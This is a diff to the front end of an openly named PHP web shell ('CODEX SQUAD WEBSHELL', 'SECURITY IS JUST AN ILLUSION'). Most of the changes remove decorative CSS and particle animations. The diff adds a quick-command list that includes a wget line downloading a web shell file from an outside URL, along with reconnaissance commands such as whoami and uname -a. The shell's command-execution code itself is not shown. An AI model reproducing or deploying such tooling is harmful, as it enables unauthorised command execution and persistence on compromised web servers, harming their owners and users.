@@ -841,7 +841,7 @@ ob_end_flush();
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>0xC0D3X Mobile</title>
     <style>
-        /* [KEEP ALL YOUR EXISTING CSS STYLES HERE] */
+        /* [KEEP ALL YOUR EXISTING CSS STYLES HERE - NO CHANGES] */
         /* MOBILE PORTRAIT ONLY UI */
         * {
             margin: 0;
@@ -861,17 +861,6 @@ ob_end_flush();
             color: #333;
             touch-action: manipulation;
             overflow-x: hidden;
-        }
-        
-        /* Particle canvas */
-        #particles-js {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
         }
         
         /* Force portrait orientation */
@@ -897,21 +886,18 @@ ob_end_flush();
         }
         
         .neumorphic-container {
-            background: rgba(240, 240, 240, 0.92);
+            background: #f0f0f0;
             border-radius: 20px;
             padding: 15px;
             box-shadow: 
-                12px 12px 24px rgba(217, 217, 217, 0.8),
-                -12px -12px 24px rgba(255, 255, 255, 0.8),
-                0 0 60px rgba(0, 100, 255, 0.1);
+                12px 12px 24px #d9d9d9,
+                -12px -12px 24px #ffffff;
             width: 100%;
             max-width: 100%;
             border: 1px solid rgba(255, 255, 255, 0.5);
             position: relative;
             overflow: hidden;
             margin: auto;
-            backdrop-filter: blur(5px);
-            z-index: 1;
         }
         
         .neumorphic-container::before {
@@ -921,13 +907,7 @@ ob_end_flush();
             left: 0;
             right: 0;
             height: 3px;
-            background: linear-gradient(90deg, transparent, rgba(0, 100, 255, 0.3), transparent);
-            animation: glow 3s ease-in-out infinite alternate;
-        }
-        
-        @keyframes glow {
-            0% { opacity: 0.3; }
-            100% { opacity: 0.8; }
+            background: linear-gradient(90deg, #f0f0f0, rgba(0,0,0,0.1), #f0f0f0);
         }
         
         .header {
@@ -935,7 +915,6 @@ ob_end_flush();
             margin-bottom: 20px;
             padding-bottom: 15px;
             border-bottom: 2px solid rgba(0, 0, 0, 0.08);
-            position: relative;
         }
         
         .title {
@@ -945,13 +924,6 @@ ob_end_flush();
             letter-spacing: 0.5px;
             margin-bottom: 5px;
             text-transform: uppercase;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.9; }
         }
         
         .subtitle {
@@ -962,44 +934,18 @@ ob_end_flush();
         }
         
         .login-container, .command-interface {
-            background: rgba(240, 240, 240, 0.9);
+            background: #f0f0f0;
             border-radius: 15px;
             padding: 15px;
             margin-bottom: 15px;
             box-shadow: 
                 inset 4px 4px 8px #e0e0e0,
-                inset -4px -4px 8px #ffffff,
-                0 0 20px rgba(0, 100, 255, 0.05);
+                inset -4px -4px 8px #ffffff;
             border: 1px solid rgba(255, 255, 255, 0.5);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .login-container::before, .command-interface::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.1),
-                transparent
-            );
-            transform: rotate(45deg);
-            animation: shimmer 3s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { transform: translateX(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) rotate(45deg); }
         }
         
         .form-group {
             margin-bottom: 15px;
-            position: relative;
         }
         
         .form-label {
@@ -1020,25 +966,20 @@ ob_end_flush();
             background: #f0f0f0;
             box-shadow: 
                 inset 4px 4px 8px #e0e0e0,
-                inset -4px -4px 8px #ffffff,
-                0 0 15px rgba(0, 100, 255, 0.1);
+                inset -4px -4px 8px #ffffff;
             font-size: 1em;
             color: #333;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             -webkit-appearance: none;
             appearance: none;
             font-family: inherit;
-            position: relative;
-            z-index: 1;
         }
         
         .form-input:focus, .command-input:focus {
             outline: none;
             box-shadow: 
                 inset 3px 3px 6px #e0e0e0,
-                inset -3px -3px 6px #ffffff,
-                0 0 25px rgba(0, 100, 255, 0.2);
-            transform: translateY(-1px);
+                inset -3px -3px 6px #ffffff;
         }
         
         .button-group {
@@ -1062,15 +1003,14 @@ ob_end_flush();
             font-size: 0.95em;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             text-transform: uppercase;
             letter-spacing: 0.8px;
-            background: linear-gradient(145deg, #f0f0f0, #e6e6e6);
+            background: #f0f0f0;
             color: #333;
             box-shadow: 
                 6px 6px 12px #e0e0e0,
-                -6px -6px 12px #ffffff,
-                0 0 20px rgba(0, 100, 255, 0.1);
+                -6px -6px 12px #ffffff;
             position: relative;
             overflow: hidden;
             min-height: 50px;
@@ -1079,50 +1019,29 @@ ob_end_flush();
             justify-content: center;
             user-select: none;
             text-align: center;
-            z-index: 1;
         }
         
-        .neumorphic-button::before {
+        .neumorphic-button::after {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(145deg, #e6e6e6, #f0f0f0);
+            background: rgba(255, 255, 255, 0.1);
             opacity: 0;
-            transition: opacity 0.3s;
-            z-index: -1;
-        }
-        
-        .neumorphic-button:hover::before {
-            opacity: 1;
-        }
-        
-        .neumorphic-button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
-            transform: translate(-50%, -50%);
-            transition: width 0.4s, height 0.4s;
-            border-radius: 50%;
+            transition: opacity 0.2s;
         }
         
         .neumorphic-button:active::after {
-            width: 200px;
-            height: 200px;
+            opacity: 1;
         }
         
         .neumorphic-button:active {
-            transform: translateY(2px);
+            transform: translateY(1px);
             box-shadow: 
                 inset 3px 3px 6px #e0e0e0,
-                inset -3px -3px 6px #ffffff,
-                0 0 15px rgba(0, 100, 255, 0.1);
+                inset -3px -3px 6px #ffffff;
         }
         
         .alert {
@@ -1135,40 +1054,9 @@ ob_end_flush();
             letter-spacing: 0.5px;
             box-shadow: 
                 6px 6px 12px #e0e0e0,
-                -6px -6px 12px #ffffff,
-                0 0 20px rgba(0, 100, 255, 0.1);
+                -6px -6px 12px #ffffff;
             border: 1px solid rgba(255, 255, 255, 0.5);
             font-size: 0.9em;
-            position: relative;
-            overflow: hidden;
-            animation: slideIn 0.5s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .alert::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, currentColor, transparent);
-            animation: alertGlow 2s infinite;
-        }
-        
-        @keyframes alertGlow {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
         }
         
         .alert-danger {
@@ -1198,16 +1086,9 @@ ob_end_flush();
             word-break: break-all;
             box-shadow: 
                 inset 3px 3px 6px #e0e0e0,
-                inset -3px -3px 6px #ffffff,
-                0 0 15px rgba(0, 100, 255, 0.1);
+                inset -3px -3px 6px #ffffff;
             border: 1px solid rgba(255, 255, 255, 0.5);
             font-size: 0.85em;
-            animation: pulseGlow 2s infinite alternate;
-        }
-        
-        @keyframes pulseGlow {
-            0% { box-shadow: inset 3px 3px 6px #e0e0e0, inset -3px -3px 6px #ffffff, 0 0 15px rgba(0, 100, 255, 0.1); }
-            100% { box-shadow: inset 3px 3px 6px #e0e0e0, inset -3px -3px 6px #ffffff, 0 0 25px rgba(0, 100, 255, 0.3); }
         }
         
         .command-form {
@@ -1223,27 +1104,9 @@ ob_end_flush();
             overflow-y: auto;
             box-shadow: 
                 inset 3px 3px 6px #000000,
-                inset -3px -3px 6px #333333,
-                0 0 30px rgba(0, 255, 0, 0.1);
+                inset -3px -3px 6px #333333;
             border: 1px solid #333;
             -webkit-overflow-scrolling: touch;
-            position: relative;
-        }
-        
-        .output-container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #00ff00, transparent);
-            animation: scanLine 2s linear infinite;
-        }
-        
-        @keyframes scanLine {
-            0% { top: 0; }
-            100% { top: 100%; }
         }
         
         pre {
@@ -1253,7 +1116,6 @@ ob_end_flush();
             line-height: 1.4;
             white-space: pre-wrap;
             word-wrap: break-word;
-            text-shadow: 0 0 5px #00ff00;
         }
         
         .info-panel {
@@ -1272,28 +1134,16 @@ ob_end_flush();
             text-align: center;
             box-shadow: 
                 4px 4px 8px #e0e0e0,
-                -4px -4px 8px #ffffff,
-                0 0 15px rgba(0, 100, 255, 0.1);
-            transition: all 0.3s ease;
+                -4px -4px 8px #ffffff;
+            transition: all 0.2s ease;
             border: 1px solid rgba(255, 255, 255, 0.5);
-            animation: float 3s ease-in-out infinite;
         }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-        
-        .info-box:nth-child(2) { animation-delay: 0.1s; }
-        .info-box:nth-child(3) { animation-delay: 0.2s; }
-        .info-box:nth-child(4) { animation-delay: 0.3s; }
         
         .info-box:active {
             transform: translateY(1px);
             box-shadow: 
                 inset 3px 3px 6px #e0e0e0,
-                inset -3px -3px 6px #ffffff,
-                0 0 10px rgba(0, 100, 255, 0.1);
+                inset -3px -3px 6px #ffffff;
         }
         
         .info-label {
@@ -1309,7 +1159,6 @@ ob_end_flush();
             font-size: 1em;
             font-weight: 800;
             color: #333;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
         }
         
         .footer {
@@ -1325,13 +1174,6 @@ ob_end_flush();
         .install-button {
             width: 100%;
             margin-top: 10px;
-        }
-        
-        /* Particle effects */
-        .particle {
-            position: absolute;
-            pointer-events: none;
-            z-index: 0;
         }
         
         /* Mobile optimizations */
@@ -1418,7 +1260,6 @@ ob_end_flush();
         .output-container::-webkit-scrollbar-thumb {
             background: #00ff00;
             border-radius: 2px;
-            box-shadow: 0 0 5px #00ff00;
         }
         
         /* Button styling for specific buttons */
@@ -1468,29 +1309,12 @@ ob_end_flush();
                 padding-top: 10px;
             }
         }
-        
-        /* Glowing text effect */
-        .glow {
-            text-shadow: 0 0 10px currentColor, 0 0 20px currentColor;
-            animation: textGlow 2s ease-in-out infinite alternate;
-        }
-        
-        @keyframes textGlow {
-            from { text-shadow: 0 0 5px currentColor, 0 0 10px currentColor; }
-            to { text-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor; }
-        }
     </style>
 </head>
 <body>
-    <!-- Particle Canvas -->
-    <div id="particles-js"></div>
-    
-    <!-- Additional particles for UI -->
-    <div id="ui-particles"></div>
-    
     <div class="neumorphic-container">
         <div class="header">
-            <h4 class="title glow">CODEX SQUAD WEBSHELL</h4>
+            <h4 class="title">CODEX SQUAD WEBSHELL</h4>
             <p class="subtitle">SECURITY IS JUST AN ILLUSION</p>
         </div>
         
@@ -1656,164 +1480,7 @@ if (!empty($command)) {
     </div>
 
     <script>
-        // Particle System Implementation
-        class ParticleSystem {
-            constructor() {
-                this.particles = [];
-                this.uiParticles = [];
-                this.container = document.getElementById('ui-particles');
-                this.canvas = document.getElementById('particles-js');
-                this.ctx = this.canvas.getContext('2d');
-                this.resizeCanvas();
-                
-                // Background particles
-                this.createBackgroundParticles();
-                
-                // UI particles
-                this.createUIParticles();
-                
-                // Animation loop
-                this.animate();
-                
-                // Resize handler
-                window.addEventListener('resize', () => this.resizeCanvas());
-            }
-            
-            resizeCanvas() {
-                this.canvas.width = window.innerWidth;
-                this.canvas.height = window.innerHeight;
-            }
-            
-            createBackgroundParticles() {
-                const particleCount = Math.min(100, Math.floor((window.innerWidth * window.innerHeight) / 10000));
-                
-                for (let i = 0; i < particleCount; i++) {
-                    this.particles.push({
-                        x: Math.random() * this.canvas.width,
-                        y: Math.random() * this.canvas.height,
-                        size: Math.random() * 2 + 1,
-                        speedX: (Math.random() - 0.5) * 0.5,
-                        speedY: (Math.random() - 0.5) * 0.5,
-                        color: `rgba(${Math.floor(Math.random() * 100 + 155)}, ${Math.floor(Math.random() * 100 + 155)}, 255, ${Math.random() * 0.5 + 0.1})`
-                    });
-                }
-            }
-            
-            createUIParticles() {
-                // Create particles around the neumorphic container
-                const container = document.querySelector('.neumorphic-container');
-                if (!container) return;
-                
-                const rect = container.getBoundingClientRect();
-                const particleCount = 30;
-                
-                for (let i = 0; i < particleCount; i++) {
-                    const particle = document.createElement('div');
-                    particle.className = 'particle';
-                    particle.style.cssText = `
-                        width: ${Math.random() * 3 + 1}px;
-                        height: ${Math.random() * 3 + 1}px;
-                        background: ${Math.random() > 0.5 ? '#0066cc' : '#00aaff'};
-                        border-radius: 50%;
-                        position: fixed;
-                        z-index: 0;
-                        opacity: ${Math.random() * 0.3 + 0.1};
-                    `;
-                    
-                    this.uiParticles.push({
-                        element: particle,
-                        x: rect.left + Math.random() * rect.width,
-                        y: rect.top + Math.random() * rect.height,
-                        speedX: (Math.random() - 0.5) * 0.5,
-                        speedY: (Math.random() - 0.5) * 0.5,
-                        amplitude: Math.random() * 20 + 5,
-                        frequency: Math.random() * 0.02 + 0.01,
-                        time: Math.random() * Math.PI * 2
-                    });
-                    
-                    this.container.appendChild(particle);
-                }
-            }
-            
-            updateBackgroundParticles() {
-                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
-                
-                // Draw connecting lines
-                for (let i = 0; i < this.particles.length; i++) {
-                    for (let j = i + 1; j < this.particles.length; j++) {
-                        const dx = this.particles[i].x - this.particles[j].x;
-                        const dy = this.particles[i].y - this.particles[j].y;
-                        const distance = Math.sqrt(dx * dx + dy * dy);
-                        
-                        if (distance < 100) {
-                            this.ctx.beginPath();
-                            this.ctx.strokeStyle = `rgba(100, 150, 255, ${0.1 * (1 - distance/100)})`;
-                            this.ctx.lineWidth = 0.5;
-                            this.ctx.moveTo(this.particles[i].x, this.particles[i].y);
-                            this.ctx.lineTo(this.particles[j].x, this.particles[j].y);
-                            this.ctx.stroke();
-                        }
-                    }
-                }
-                
-                // Update and draw particles
-                this.particles.forEach(particle => {
-                    particle.x += particle.speedX;
-                    particle.y += particle.speedY;
-                    
-                    // Bounce off edges
-                    if (particle.x < 0 || particle.x > this.canvas.width) particle.speedX *= -1;
-                    if (particle.y < 0 || particle.y > this.canvas.height) particle.speedY *= -1;
-                    
-                    // Draw particle
-                    this.ctx.beginPath();
-                    this.ctx.fillStyle = particle.color;
-                    this.ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
-                    this.ctx.fill();
-                });
-            }
-            
-            updateUIParticles() {
-                const container = document.querySelector('.neumorphic-container');
-                if (!container) return;
-                
-                const rect = container.getBoundingClientRect();
-                
-                this.uiParticles.forEach(p => {
-                    p.time += p.frequency;
-                    
-                    // Circular motion around container
-                    const angle = p.time;
-                    const radius = p.amplitude;
-                    
-                    let targetX = rect.left + rect.width/2 + Math.cos(angle) * (rect.width/2 + radius);
-                    let targetY = rect.top + rect.height/2 + Math.sin(angle) * (rect.height/2 + radius);
-                    
-                    // Smooth movement
-                    p.x += (targetX - p.x) * 0.1;
-                    p.y += (targetY - p.y) * 0.1;
-                    
-                    // Update position
-                    p.element.style.left = p.x + 'px';
-                    p.element.style.top = p.y + 'px';
-                    
-                    // Pulsing effect
-                    const scale = 0.5 + Math.sin(p.time * 2) * 0.5;
-                    p.element.style.transform = `scale(${scale})`;
-                });
-            }
-            
-            animate() {
-                this.updateBackgroundParticles();
-                this.updateUIParticles();
-                requestAnimationFrame(() => this.animate());
-            }
-        }
-        
         document.addEventListener('DOMContentLoaded', function() {
-            // Initialize particle system
-            const particleSystem = new ParticleSystem();
-            
             const cmdInput = document.getElementById('cmd');
             const cmdHidden = document.getElementById('cmdHidden');
             const cmdForm = document.getElementById('cmdForm');
@@ -1829,9 +1496,6 @@ if (!empty($command)) {
                         e.preventDefault();
                         cmdHidden.value = cmdInput.value;
                         cmdForm.submit();
-                        
-                        // Add particle burst effect
-                        createButtonParticles(this);
                     });
                 }
                 
@@ -1850,62 +1514,6 @@ if (!empty($command)) {
                     }
                 });
             }
-            
-            // Button particle effect
-            function createButtonParticles(button) {
-                const rect = button.getBoundingClientRect();
-                const particleCount = 20;
-                
-                for (let i = 0; i < particleCount; i++) {
-                    const particle = document.createElement('div');
-                    particle.className = 'particle';
-                    particle.style.cssText = `
-                        width: ${Math.random() * 4 + 2}px;
-                        height: ${Math.random() * 4 + 2}px;
-                        background: #0066cc;
-                        border-radius: 50%;
-                        position: fixed;
-                        left: ${rect.left + rect.width/2}px;
-                        top: ${rect.top + rect.height/2}px;
-                        z-index: 1000;
-                        pointer-events: none;
-                    `;
-                    
-                    document.body.appendChild(particle);
-                    
-                    const angle = Math.random() * Math.PI * 2;
-                    const speed = Math.random() * 3 + 2;
-                    const velocity = {
-                        x: Math.cos(angle) * speed,
-                        y: Math.sin(angle) * speed
-                    };
-                    
-                    let opacity = 1;
-                    const animateParticle = () => {
-                        const rect = particle.getBoundingClientRect();
-                        particle.style.left = (parseFloat(particle.style.left) || 0) + velocity.x + 'px';
-                        particle.style.top = (parseFloat(particle.style.top) || 0) + velocity.y + 'px';
-                        opacity -= 0.05;
-                        particle.style.opacity = opacity;
-                        particle.style.transform = `scale(${opacity})`;
-                        
-                        if (opacity > 0) {
-                            requestAnimationFrame(animateParticle);
-                        } else {
-                            particle.remove();
-                        }
-                    };
-                    
-                    requestAnimationFrame(animateParticle);
-                }
-            }
-            
-            // Add particle effect to all buttons
-            document.querySelectorAll('.neumorphic-button').forEach(button => {
-                button.addEventListener('click', function(e) {
-                    createButtonParticles(this);
-                });
-            });
             
             // Mobile optimizations
             document.addEventListener('touchstart', function() {}, {passive: true});
@@ -1979,101 +1587,29 @@ if (!empty($command)) {
             adjustLayout();
             window.addEventListener('resize', adjustLayout);
             
-            // Input field particle effect
-            const inputs = document.querySelectorAll('.form-input, .command-input');
-            inputs.forEach(input => {
-                input.addEventListener('focus', function() {
-                    this.style.boxShadow = 'inset 3px 3px 6px #e0e0e0, inset -3px -3px 6px #ffffff, 0 0 30px rgba(0, 100, 255, 0.3)';
-                    
-                    // Create particles around input
-                    const rect = this.getBoundingClientRect();
-                    for (let i = 0; i < 10; i++) {
-                        setTimeout(() => {
-                            const particle = document.createElement('div');
-                            particle.style.cssText = `
-                                width: 2px;
-                                height: 2px;
-                                background: #0066cc;
-                                border-radius: 50%;
-                                position: fixed;
-                                left: ${rect.left + Math.random() * rect.width}px;
-                                top: ${rect.bottom}px;
-                                z-index: 1000;
-                                pointer-events: none;
-                            `;
-                            
-                            document.body.appendChild(particle);
-                            
-                            let opacity = 1;
-                            const animate = () => {
-                                particle.style.top = (parseFloat(particle.style.top) || 0) - 2 + 'px';
-                                particle.style.opacity = opacity;
-                                opacity -= 0.05;
-                                
-                                if (opacity > 0) {
-                                    requestAnimationFrame(animate);
-                                } else {
-                                    particle.remove();
-                                }
-                            };
-                            
-                            animate();
-                        }, i * 50);
-                    }
-                });
-                
-                input.addEventListener('blur', function() {
-                    this.style.boxShadow = 'inset 4px 4px 8px #e0e0e0, inset -4px -4px 8px #ffffff, 0 0 15px rgba(0, 100, 255, 0.1)';
-                });
-            });
+            // Add quick command examples
+            const quickCommands = [
+                'wget -O 0xC0D3X.php https://raw.githubusercontent.com/example/repo/main/0xC0D3X.php',
+                'pwd',
+                'ls -la',
+                'whoami',
+                'uname -a'
+            ];
             
-            // Alert particle effect
-            const alerts = document.querySelectorAll('.alert');
-            alerts.forEach(alert => {
-                setTimeout(() => {
-                    const rect = alert.getBoundingClientRect();
-                    for (let i = 0; i < 15; i++) {
-                        const particle = document.createElement('div');
-                        particle.style.cssText = `
-                            width: ${Math.random() * 3 + 1}px;
-                            height: ${Math.random() * 3 + 1}px;
-                            background: ${alert.classList.contains('alert-danger') ? '#ff4444' : 
-                                      alert.classList.contains('alert-success') ? '#00aa00' : '#0066cc'};
-                            border-radius: 50%;
-                            position: fixed;
-                            left: ${rect.left + Math.random() * rect.width}px;
-                            top: ${rect.top + Math.random() * rect.height}px;
-                            z-index: 1000;
-                            pointer-events: none;
-                        `;
-                        
-                        document.body.appendChild(particle);
-                        
-                        const angle = Math.random() * Math.PI * 2;
-                        const speed = Math.random() * 2 + 1;
-                        const velocity = {
-                            x: Math.cos(angle) * speed,
-                            y: Math.sin(angle) * speed
-                        };
-                        
-                        let opacity = 1;
-                        const animate = () => {
-                            particle.style.left = (parseFloat(particle.style.left) || 0) + velocity.x + 'px';
-                            particle.style.top = (parseFloat(particle.style.top) || 0) + velocity.y + 'px';
-                            particle.style.opacity = opacity;
-                            opacity -= 0.03;
-                            
-                            if (opacity > 0) {
-                                requestAnimationFrame(animate);
-                            } else {
-                                particle.remove();
-                            }
-                        };
-                        
-                        animate();
-                    }
-                }, 100);
+            // Optional: Add a quick command selector (uncomment if needed)
+            /*
+            const quickSelect = document.createElement('select');
+            quickSelect.innerHTML = '<option>Quick Commands</option>' + 
+                quickCommands.map(cmd => `<option value="${cmd}">${cmd.substring(0, 50)}...</option>`).join('');
+            quickSelect.style.cssText = 'width:100%;margin-bottom:10px;padding:8px;border-radius:8px;';
+            quickSelect.addEventListener('change', function() {
+                if (this.value && cmdInput) {
+                    cmdInput.value = this.value;
+                    cmdHidden.value = this.value;
+                }
             });
+            document.querySelector('.command-form').insertBefore(quickSelect, document.querySelector('.button-group'));
+            */
         });
     </script>
 </body>
